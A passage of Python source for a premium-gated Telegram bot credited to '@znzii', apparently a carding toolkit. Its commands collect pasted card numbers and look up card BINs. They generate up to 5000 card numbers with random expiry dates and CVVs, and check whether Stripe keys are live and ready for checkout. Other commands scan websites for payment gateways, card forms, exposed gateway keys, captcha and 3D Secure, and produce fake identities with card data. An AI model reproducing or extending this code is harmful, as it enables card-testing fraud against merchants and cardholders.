        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return
    
    data = COLLECT_DATA.pop(user_id)
    cards = data['cards']
    
    if user_id in COLLECT_TIMERS:
        COLLECT_TIMERS[user_id].cancel()
        COLLECT_TIMERS.pop(user_id, None)
    
    if not cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ᴄᴏʟʟᴇᴄᴛᴇᴅ!"), parse_mode='html')
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"collected_cards_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w') as f:
        for card in cards:
            await f.write(f"{card}\n")
    
    await bot.send_file(
        user_id,
        filename,
        caption=premium_emoji(f" Cᴏʟʟᴇᴄᴛɪᴏɴ Cᴏᴍᴘʟᴇᴛᴇ!\nTᴏᴛᴀʟ Cᴀʀᴅs: {len(cards)}")
    )
    
    try:
        os.remove(filename)
    except:
        pass
    
    await event.reply(premium_emoji(f"✅ Cᴏʟʟᴇᴄᴛᴇᴅ {len(cards)} ᴄᴀʀᴅs!"), parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "+5 MIN"))
async def extend_collect(event):
    user_id = event.sender_id
    
    if user_id not in COLLECT_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return
    
    data = COLLECT_DATA[user_id]
    data['expire_time'] = data['expire_time'] + timedelta(minutes=5)
    
    remaining = int((data['expire_time'] - datetime.now()).total_seconds() / 60)
    
    await event.reply(premium_emoji(f"⏱️ +5 ᴍɪɴᴜᴛᴇs ᴀᴅᴅᴇᴅ!\n📊 Rᴇᴍᴀɪɴɪɴɢ: {remaining} ᴍɪɴᴜᴛᴇs"), parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "CANCEL"))
async def cancel_collect(event):
    user_id = event.sender_id
    
    if user_id not in COLLECT_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return
    
    COLLECT_DATA.pop(user_id, None)
    
    if user_id in COLLECT_TIMERS:
        COLLECT_TIMERS[user_id].cancel()
        COLLECT_TIMERS.pop(user_id, None)
    
    await event.reply(premium_emoji("❌ Cᴏʟʟᴇᴄᴛɪᴏɴ Cᴀɴᴄᴇʟʟᴇᴅ!"), parse_mode='html')

@bot.on(events.NewMessage)
async def collect_cards_handler(event):
    user_id = event.sender_id
    
    if user_id not in COLLECT_DATA:
        return
    
    if not event.text:
        return
    
    if event.text.startswith('/'):
        return
    
    if event.text.upper() in ["COLLECT", "+5 MIN", "CANCEL"]:
        return
    
    cards = extract_cc(event.text)
    
    if not cards:
        return
    
    data = COLLECT_DATA[user_id]
    data['cards'].extend(cards)
    
@bot.on(events.NewMessage(pattern='/bin'))
async def bin_lookup(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/bin 411111</code>"), parse_mode='html')
        return
    
    bin_number = parts[1].strip()[:6]
    
    if not bin_number.isdigit() or len(bin_number) < 6:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ BIN! Eɴᴛᴇʀ ᴀᴛ ʟᴇᴀsᴛ 6 ᴅɪɢɪᴛs."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔄 Lᴏᴏᴋɪɴɢ ᴜᴘ BIN <code>{bin_number}</code>..."), parse_mode='html')
    
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        session = await get_http_session()
        async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    await status_msg.edit(premium_emoji(f"❌ BIN <code>{bin_number}</code> Nᴏᴛ Fᴏᴜɴᴅ!"), parse_mode='html')
                    return
                
                data = await res.json()
                
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                prepaid = data.get('prepaid', False)
                card_type = data.get('card_type', '-')
                
                prepaid_text = "✅ Pʀᴇᴘᴀɪᴅ" if prepaid else "❌ Nᴏᴛ Pʀᴇᴘᴀɪᴅ"
                
                result = f"""🔍 <b>BIN Lᴏᴏᴋᴜᴘ</b>

💡  BIN: <code>{bin_number}</code>
💡️  Bʀᴀɴᴅ: {brand}
📝  Tʏᴘᴇ: {bin_type}
💳  Cᴀʀᴅ Tʏᴘᴇ: {card_type}
⭐  Lᴇᴠᴇʟ: {level}
🏦  Bᴀɴᴋ: {bank}
💡  Cᴏᴜɴᴛʀʏ: {country} {flag}
💵  Pʀᴇᴘᴀɪᴅ: {prepaid_text}

💡 Mᴀᴅᴇ ʙʏ @znzii"""
                
                await status_msg.edit(premium_emoji(result), parse_mode='html')
                
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern='/gen'))
async def gen_cards(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/gen BIN [count]</code>

Exᴀᴍᴘʟᴇs:
<code>/gen 415920</code>
<code>/gen 415920 20</code>
<code>/gen 415920|12|2028|123 10</code>"""), parse_mode='html')
        return
    
    try:
        args = parts[1]
        count = 10
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 5000:
                    count = 5000
            except:
                pass
        
        if '|' in args:
            bin_parts = args.split('|')
            prefix = bin_parts[0][:6]
            mm = bin_parts[1] if len(bin_parts) > 1 else 'xx'
            yy = bin_parts[2] if len(bin_parts) > 2 else 'xx'
            cvv = bin_parts[3] if len(bin_parts) > 3 else 'xxx'
        else:
            prefix = args[:6]
            mm = 'xx'
            yy = 'xx'
            cvv = 'xxx'
        
        if not prefix.isdigit() or len(prefix) < 6:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ BIN! Mᴜsᴛ ʙᴇ ᴀᴛ ʟᴇᴀsᴛ 6 ᴅɪɢɪᴛs."), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji(f"🔄 Gᴇɴᴇʀᴀᴛɪɴɢ {count} ᴄᴀʀᴅs..."), parse_mode='html')
        
        cards = []
        current_yy = datetime.now().year % 100
        
        for _ in range(count):
            card = prefix
            if len(card) < 16:
                card += ''.join(random.choices('0123456789', k=16 - len(card)))
            mm_final = mm if mm != 'xx' else f"{random.randint(1, 12):02d}"
            yy_final = yy if yy != 'xx' else f"{random.randint(current_yy, current_yy + 5)}"
            cvv_final = cvv if cvv != 'xxx' else f"{random.randint(100, 999)}"
            cards.append(f"{card}|{mm_final}|{yy_final}|{cvv_final}")
        
        bin_info = await get_bin_info(prefix)
        brand, bin_type, level, bank, country, flag = bin_info
        
        is_amex = prefix.startswith("34") or prefix.startswith("37")
        card_len = 15 if is_amex else 16
        display_prefix = prefix + "x" * (card_len - len(prefix))
        
        if count > 50:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"generated_cards_{timestamp}.txt"
            async with aiofiles.open(filename, 'w') as f:
                for card in cards:
                    await f.write(f"{card}\n")
            
            caption = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
     Cᴀʀᴅ Gᴇɴᴇʀᴀᴛᴏʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🔢 BIN: <code>{prefix}</code>
📊 Cᴀʀᴅs: <code>{len(cards)}</code>

💳 {brand or '─'}  
📝 {bin_type or '─'}
💡️ {level or '─'}
🏦 {bank or '─'}
{flag} {country or '─'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 @znzii"""
            
            await bot.send_file(
                user_id,
                filename,
                caption=premium_emoji(caption),
                parse_mode='html'
            )
            
            try:
                os.remove(filename)
            except:
                pass
            
            await status_msg.delete()
            return
        
        cards_text = "\n".join(f"<code>{c}</code>" for c in cards)
        
        result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
     Cᴀʀᴅ Gᴇɴᴇʀᴀᴛᴏʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🔢 BIN: <code>{display_prefix}</code>
📊 Cᴀʀᴅs: <code>{len(cards)}/{count}</code>

{cards_text}

∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💳 {brand or '─'}  
📝 {bin_type or '─'}
💡️ {level or '─'}
🏦 {bank or '─'}
{flag} {country or '─'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 @znzii"""
        
        await status_msg.edit(premium_emoji(result), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
@bot.on(events.NewMessage(pattern='/sk'))
async def stripe_key_check(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/sk &lt;Stripe_Key&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/sk pk_live_xxxxxxxxxxxxxxxxxxxx</code>
<code>/sk pk_test_xxxxxxxxxxxxxxxxxxxx</code>
<code>/sk sk_live_xxxxxxxxxxxxxxxxxxxx</code>"""), parse_mode='html')
        return
    
    key = parts[1].strip()
    
    if not key.startswith(('pk_live_', 'pk_test_', 'sk_live_', 'sk_test_')):
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ Sᴛʀɪᴘᴇ Kᴇʏ!\n\nMᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ:\n<code>pk_live_</code>, <code>pk_test_</code>, <code>sk_live_</code>, ᴏʀ <code>sk_test_</code>"), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ Sᴛʀɪᴘᴇ Kᴇʏ..."), parse_mode='html')
    
    try:
        t0 = time.time()
        
        if key.startswith(('sk_live_', 'sk_test_')):
            key_type = "SECRET LIVE " if key.startswith('sk_live_') else "SECRET TEST "
        else:
            key_type = "LIVE " if key.startswith('pk_live_') else "TEST "
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36"
        }
        data = {"key": key}
        
        timeout = aiohttp.ClientTimeout(total=15)
        session = await get_http_session()
        async with session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data) as resp:
                status_code = resp.status
                elapsed_ms = round((time.time() - t0) * 1000)
                
                try:
                    body = await resp.json()
                except:
                    body = {}
                
                error_msg = body.get('error', {}).get('message', '') if isinstance(body, dict) else ''
                
                if resp.status == 200:
                    status_icon = "✅"
                    status_label = "VALID"
                    details = f"""  • Kᴇʏ ɪs ᴀᴄᴄᴇᴘᴛᴇᴅ ʙʏ Sᴛʀɪᴘᴇ API
  • Cᴀɴ ʙᴇ ᴜsᴇᴅ ғᴏʀ ᴛᴏᴋᴇɴ ᴄʀᴇᴀᴛɪᴏɴ
  • Rᴇᴀᴅʏ ғᴏʀ ᴄʜᴇᴄᴋᴏᴜᴛ ɪɴᴛᴇɢʀᴀᴛɪᴏɴ"""
                    
                elif resp.status == 401:
                    error_lower = error_msg.lower()
                    if "invalid api key" in error_lower:
                        status_icon = "❌"
                        status_label = "INVALID"
                        details = f"  • Rᴇᴀsᴏɴ: Iɴᴠᴀʟɪᴅ API Kᴇʏ"
                    elif "platform" in error_lower or "account" in error_lower:
                        status_icon = "⚠️"
                        status_label = "VALID (Aᴄᴄᴏᴜɴᴛ Mɪsᴍᴀᴛᴄʜ)"
                        details = f"""  • Kᴇʏ ғᴏʀᴍᴀᴛ ɪs ᴄᴏʀʀᴇᴄᴛ
  • Nᴇᴇᴅs <code>_stripe_account</code> ʜᴇᴀᴅᴇʀ
  • Eʀʀᴏʀ: {error_msg[:80]}"""
                    else:
                        status_icon = "❌"
                        status_label = "AUTH ERROR"
                        details = f"  • Rᴇᴀsᴏɴ: {error_msg[:80] or 'Aᴜᴛʜ ᴇʀʀᴏʀ'}"
                elif resp.status == 429:
                    status_icon = "⚠️"
                    status_label = "RATE LIMITED"
                    details = f"  • Rᴇᴀsᴏɴ: Tᴏᴏ ᴍᴀɴʏ ʀᴇǫᴜᴇsᴛs (429)"
                else:
                    status_icon = "❌"
                    status_label = "UNKNOWN"
                    details = f"  • Rᴇᴀsᴏɴ: Uɴᴇxᴘᴇᴄᴛᴇᴅ sᴛᴀᴛᴜs {resp.status}"
        
        result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    SK Cʜᴇᴄᴋᴇʀ
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
  {status_icon} <b>{status_label}</b>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼

🔑 Kᴇʏ: <code>{key}</code>
📋 Tʏᴘᴇ: <b>{key_type}</b>

📡 API: <code>{status_code}</code>
⏱️ Tɪᴍᴇ: <code>{elapsed_ms}ms</code>

{details}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 @znzii"""
        
        await status_msg.edit(premium_emoji(result), parse_mode='html')
        
    except asyncio.TimeoutError:
        await status_msg.edit(premium_emoji("❌ Rᴇǫᴜᴇsᴛ ᴛɪᴍᴇᴅ ᴏᴜᴛ (15s)"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/scg'))
async def site_check(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/scg &lt;URL&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/scg https://example.com</code>
<code>/scg example.com</code>"""), parse_mode='html')
        return
    
    url = parts[1].strip()
    if not url.startswith('http'):
        url = f'https://{url}'
    
    status_msg = await event.reply(premium_emoji(f"🔍 Sᴄᴀɴɴɪɴɢ <code>{url}</code>..."), parse_mode='html')
    
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1",
            "DNT": "1",
            "Connection": "keep-alive"
        }
        
        timeout = aiohttp.ClientTimeout(total=30)
        session = await get_http_session()
        async with session.get(url, headers=headers, ssl=False, allow_redirects=True) as resp:
                html = await resp.text()
                final_url = str(resp.url)
        
        site_display = final_url.replace('https://', '').replace('http://', '')
        
        gateways = detect_gateways(html)
        cms_list = detect_cms(html)
        captcha = detect_captcha(html) or "None"
        cloudflare = detect_cloudflare(None, html) or "None"
        cdn = detect_cdn(html, None) or "N/A"
        sec_3d = detect_3d_secure(html)
        graphql = detect_graphql(html)
        has_card = has_card_form(html)
        
        keys = extract_gateway_keys(html)
        keys_str = ""
        if keys:
            parts_list = []
            for provider, klist in keys.items():
                if klist:
                    parts_list.append(f"{provider}: <code>{klist[0][:30]}</code>")
            if parts_list:
                keys_str = "\n".join(parts_list)
        
        analytics_list = detect_analytics(html, _scripts(html))
        analytics_str = ", ".join(analytics_list) if analytics_list else "None"
        
        status_code = resp.status
        
        result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    Sɪᴛᴇ Cʜᴇᴄᴋᴇʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🌐 <b>URL:</b> <code>{site_display}</code>
📡 <b>Sᴛᴀᴛᴜs:</b> <code>{status_code}</code>
🔌 <b>Gᴀᴛᴇᴡᴀʏs:</b> {', '.join(gateways) if gateways else '❌ Nᴏɴᴇ'}
💡️ <b>CMS:</b> {', '.join(cms_list) if cms_list else 'Unknown'}
💳 <b>Cᴀʀᴅ Fᴏʀᴍ:</b> {'✅ Yᴇs' if has_card else '❌ Nᴏ'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🔑 <b>Keys:</b>
{keys_str if keys_str else '  ❌ Nᴏɴᴇ ғᴏᴜɴᴅ'}
💡️ <b>Sᴇʀᴠᴇʀ:</b> <code>{resp.headers.get('Server', 'N/A')}</code>
💡️ <b>CDN:</b> {cdn}
🛡️ <b>Cʟᴏᴜᴅғʟᴀʀᴇ:</b> {cloudflare}
💡 <b>Cᴀᴘᴛᴄʜᴀ:</b> {captcha}
🔐 <b>3D Sᴇᴄᴜʀᴇ:</b> {sec_3d}
📊 <b>GʀᴀᴘʜQL:</b> {graphql}
📈 <b>Aɴᴀʟʏᴛɪᴄs:</b> {analytics_str}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 Mᴀᴅᴇ ʙʏ @znzii"""
        
        await status_msg.edit(premium_emoji(result), parse_mode='html')
        
    except asyncio.TimeoutError:
        await status_msg.edit(premium_emoji(f"❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ sᴄᴀɴɴɪɴɢ <code>{url}</code>"), parse_mode='html')
    except aiohttp.ClientConnectorError:
        await status_msg.edit(premium_emoji(f"❌ Cᴀɴ'ᴛ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ <code>{url}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
@bot.on(events.NewMessage(pattern='/fake'))
async def fake_data(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/fake &lt;ᴄᴏᴜɴᴛʀʏ_ᴄᴏᴅᴇ&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/fake us</code>
<code>/fake eg</code>
<code>/fake fr</code>
<code>/fake gb</code>
<code>/fake sa</code>
"""), parse_mode='html')
        return
    
    country_code = parts[1].strip().lower()
    
    # تحويل كود الدولة إلى الاسم المطلوب لـ namefake
    country_map = {
        'us': 'english-united-states',
        'gb': 'english-united-kingdom',
        'eg': 'arabic-egypt',
        'fr': 'french-france',
        'de': 'german-germany',
        'it': 'italian-italy',
        'es': 'spanish-spain',
        'ru': 'russian-russia',
        'cn': 'chinese-china',
        'jp': 'japanese-japan',
        'in': 'hindi-india',
        'br': 'portuguese-brazil',
        'sa': 'arabic-saudi-arabia',
        'ae': 'arabic-united-arab-emirates',
        'dz': 'arabic-algeria',
        'ma': 'arabic-morocco',
        'tn': 'arabic-tunisia',
        'ly': 'arabic-libya',
        'sd': 'arabic-sudan',
        'ps': 'arabic-palestine',
        'jo': 'arabic-jordan',
        'lb': 'arabic-lebanon',
        'kw': 'arabic-kuwait',
        'qa': 'arabic-qatar',
        'bh': 'arabic-bahrain',
        'om': 'arabic-oman',
        'ye': 'arabic-yemen',
        'iq': 'arabic-iraq',
        'sy': 'arabic-syria',
        'tr': 'turkish-turkey',
        'pk': 'urdu-pakistan',
        'bd': 'bengali-bangladesh',
        'ph': 'filipino-philippines',
        'id': 'indonesian-indonesia',
        'th': 'thai-thailand',
        'vn': 'vietnamese-vietnam',
        'kr': 'korean-south-korea',
        'tw': 'chinese-taiwan',
        'hk': 'chinese-hong-kong',
        'mx': 'spanish-mexico',
        'ar': 'spanish-argentina',
        'cl': 'spanish-chile',
        'co': 'spanish-colombia',
        'pe': 'spanish-peru',
        've': 'spanish-venezuela',
        'nl': 'dutch-netherlands',
        'be': 'french-belgium',
        'ch': 'german-switzerland',
        'at': 'german-austria',
        'se': 'swedish-sweden',
        'no': 'norwegian-norway',
        'dk': 'danish-denmark',
        'fi': 'finnish-finland',
        'pl': 'polish-poland',
        'cz': 'czech-czech-republic',
        'hu': 'hungarian-hungary',
        'ro': 'romanian-romania',
        'bg': 'bulgarian-bulgaria',
        'gr': 'greek-greece',
        'pt': 'portuguese-portugal',
        'il': 'hebrew-israel',
        'za': 'english-south-africa',
        'ng': 'english-nigeria',
        'ke': 'english-kenya',
        'gh': 'english-ghana',
        'au': 'english-australia',
        'nz': 'english-new-zealand',
        'ca': 'english-canada'
    }
    
    country_param = country_map.get(country_code, 'english-united-states')
    
    status_msg = await event.reply(premium_emoji(f"🔄 Gᴇɴᴇʀᴀᴛɪɴɢ ғᴀᴋᴇ ᴅᴀᴛᴀ ғᴏʀ <code>{country_code}</code>..."), parse_mode='html')
    
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        
        # إضافة headers عشان نجبر الـ API يرد JSON
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        session = await get_http_session()
            # استخدام api.namefake.com مع البارامتر المناسب
        async with session.get(f"https://api.namefake.com/{country_param}/") as resp:
                if resp.status != 200:
                    await status_msg.edit(premium_emoji(f"❌ API Eʀʀᴏʀ: {resp.status}"), parse_mode='html')
                    return
                
                # قراءة النص أولاً
                text = await resp.text()
                
                # محاولة فك الـ JSON
                try:
                    import json
                    data = json.loads(text)
                except json.JSONDecodeError as e:
                    await status_msg.edit(premium_emoji(f"❌ Jsᴏɴ Pᴀʀsᴇ Eʀʀᴏʀ: {str(e)}"), parse_mode='html')
                    return
                
                if not data:
                    await status_msg.edit(premium_emoji(f"❌ Nᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ғᴏʀ <code>{country_code}</code>"), parse_mode='html')
                    return
                
                # استخراج البيانات من الـ response
                name = data.get('name', 'N/A')
                address = data.get('address', 'N/A')
                latitude = data.get('latitude', 'N/A')
                longitude = data.get('longitude', 'N/A')
                maiden_name = data.get('maiden_name', 'N/A')
                birth_data = data.get('birth_data', 'N/A')
                phone_h = data.get('phone_h', 'N/A')
                phone_w = data.get('phone_w', 'N/A')
                email_u = data.get('email_u', 'N/A')
                email_d = data.get('email_d', 'N/A')
                username = data.get('username', 'N/A')
                password = data.get('password', 'N/A')
                domain = data.get('domain', 'N/A')
                useragent = data.get('useragent', 'N/A')
                ipv4 = data.get('ipv4', 'N/A')
                macaddress = data.get('macaddress', 'N/A')
                plasticcard = data.get('plasticcard', 'N/A')
                cardexpir = data.get('cardexpir', 'N/A')
                company = data.get('company', 'N/A')
                color = data.get('color', 'N/A')
                height = data.get('height', 'N/A')
                weight = data.get('weight', 'N/A')
                blood = data.get('blood', 'N/A')
                eye = data.get('eye', 'N/A')
                hair = data.get('hair', 'N/A')
                sport = data.get('sport', 'N/A')
                
                email = f"{email_u}@{email_d}" if email_u != 'N/A' and email_d != 'N/A' else 'N/A'
                
                # جلب اسم الدولة الكامل والعلم من دالة get_flag
                country_code_upper = country_code.upper()
                flag = get_flag(country_code_upper)
                
                # جلب اسم الدولة الكامل من restcountries
                country_name = country_code_upper
                try:
                    async with session.get(f"https://restcountries.com/v3.1/alpha/{country_code_upper}") as resp2:
                        if resp2.status == 200:
                            country_data = await resp2.json()
                            if country_data and isinstance(country_data, list) and len(country_data) > 0:
                                country_name = country_data[0].get('name', {}).get('common', country_code_upper)
                                # لو العلم مش موجود في FLAGS، نجيبه من API
                                if flag == '◻️':
                                    flag = country_data[0].get('flags', {}).get('emoji', '🏳️')
                except:
                    pass
                
                result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
     Fᴀᴋᴇ Dᴀᴛᴀ Gᴇɴᴇʀᴀᴛᴏʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>Nᴀᴍᴇ</b> ↯ <code>{name}</code>
💡 <b>Mᴀɪᴅᴇɴ Nᴀᴍᴇ</b> ↯ <code>{maiden_name}</code>

💡 <b>Eᴍᴀɪʟ</b> ↯ <code>{email}</code>
💡 <b>Hᴏᴍᴇ Pʜᴏɴᴇ</b> ↯ <code>{phone_h}</code>
💡 <b>Wᴏʀᴋ Pʜᴏɴᴇ</b> ↯ <code>{phone_w}</code>

💡 <b>Aᴅᴅʀᴇss</b> ↯ <code>{address}</code>
💡 <b>Cᴏᴜɴᴛʀʏ</b> ↯ <code>{country_name}</code> {flag}
💡 <b>Cᴏᴏʀᴅɪɴᴀᴛᴇs</b> ↯ <code>{latitude}, {longitude}</code>

💡 <b>Usᴇʀɴᴀᴍᴇ</b> ↯ <code>{username}</code>
💡 <b>Pᴀssᴡᴏʀᴅ</b> ↯ <code>{password}</code>
💡 <b>Dᴏᴍᴀɪɴ</b> ↯ <code>{domain}</code>

💡 <b>Pʟᴀsᴛɪᴄ Cᴀʀᴅ</b> ↯ <code>{plasticcard}</code>
💡 <b>Cᴀʀᴅ Exᴘɪʀʏ</b> ↯ <code>{cardexpir}</code>

💡 <b>Cᴏᴍᴘᴀɴʏ</b> ↯ <code>{company}</code>
💡 <b>Cᴏʟᴏʀ</b> ↯ <code>{color}</code>

💡 <b>Hᴇɪɢʜᴛ</b> ↯ <code>{height} cm</code>
💡 <b>Wᴇɪɢʜᴛ</b> ↯ <code>{weight} kg</code>
💡 <b>Bʟᴏᴏᴅ Tʏᴘᴇ</b> ↯ <code>{blood}</code>
💡 <b>Eʏᴇ Cᴏʟᴏʀ</b> ↯ <code>{eye}</code>
💡 <b>Hᴀɪʀ</b> ↯ <code>{hair}</code>

💡 <b>Usᴇʀ Aɢᴇɴᴛ</b> ↯ <code>{useragent[:80]}...</code>
💡 <b>IP Aᴅᴅʀᴇss</b> ↯ <code>{ipv4}</code>
💡 <b>Mᴀᴄ Aᴅᴅʀᴇss</b> ↯ <code>{macaddress}</code>
💡 <b>Bɪʀᴛʜ Dᴀᴛᴀ</b> ↯ <code>{birth_data}</code>
💡 <b>Sᴘᴏʀᴛ</b> ↯ <code>{sport}</code>

∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼"""
                
                await status_msg.edit(premium_emoji(result), parse_mode='html')
                
    except asyncio.TimeoutError:
        await status_msg.edit(premium_emoji(f"❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴅᴀᴛᴀ ғᴏʀ <code>{country_code}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
       
@bot.on(events.NewMessage(pattern='/ip'))
async def ip_lookup(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    data = event.raw_text[4:].strip()
    
    if not data:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/ip &lt;IP_Address&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/ip 192.168.1.1</code>
<code>/ip 8.8.8.8</code>
"""), parse_mode='html')
        return
    
    ip_pattern = r'((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
    ip_match = re.search(ip_pattern, data)
    
    if not ip_match:
